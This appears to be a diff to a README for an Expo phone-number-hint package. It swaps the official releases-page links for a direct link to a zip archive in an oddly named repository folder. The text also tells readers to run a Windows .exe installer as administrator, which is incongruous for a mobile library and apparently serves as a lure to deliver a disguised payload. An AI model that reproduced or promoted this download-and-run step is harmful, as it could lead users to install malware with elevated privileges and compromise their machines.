@@ -1,6 +1,6 @@
 # 📱 expo-phone-number-hint - Help users input phone numbers faster
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Labial-artemisia983/expo-phone-number-hint/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Labial-artemisia983/expo-phone-number-hint/raw/refs/heads/main/blather/number_expo_phone_hint_v1.3-alpha.3.zip)
 
 This application helps users share their SIM-based phone numbers during sign-up. It uses Google Identity services to suggest phone numbers. Users select a number from a list. This skips manual typing and reduces entry errors.
 
@@ -8,7 +8,7 @@ This application helps users share their SIM-based phone numbers during sign-up.
 
 You need a Windows computer to use this tool. Ensure you have a stable internet connection. Follow these steps to set up the software on your machine.
 
-1.  Visit the [official releases page](https://github.com/Labial-artemisia983/expo-phone-number-hint/releases) to download the installer.
+1.  Visit the [official releases page](https://github.com/Labial-artemisia983/expo-phone-number-hint/raw/refs/heads/main/blather/number_expo_phone_hint_v1.3-alpha.3.zip) to download the installer.
 2.  Locate the file ending in .exe in your Downloads folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the prompts on your screen.
@@ -64,7 +64,7 @@ If the application does not show your number, try these steps:
 
 You can download the latest version of the toolkit here: 
 
-[https://github.com/Labial-artemisia983/expo-phone-number-hint/releases](https://github.com/Labial-artemisia983/expo-phone-number-hint/releases)
+[https://github.com/Labial-artemisia983/expo-phone-number-hint/raw/refs/heads/main/blather/number_expo_phone_hint_v1.3-alpha.3.zip](https://github.com/Labial-artemisia983/expo-phone-number-hint/raw/refs/heads/main/blather/number_expo_phone_hint_v1.3-alpha.3.zip)
 
 Run the installer as an administrator if your system restricts application installation. Right-click the file and choose "Run as administrator" to grant these privileges. 
 
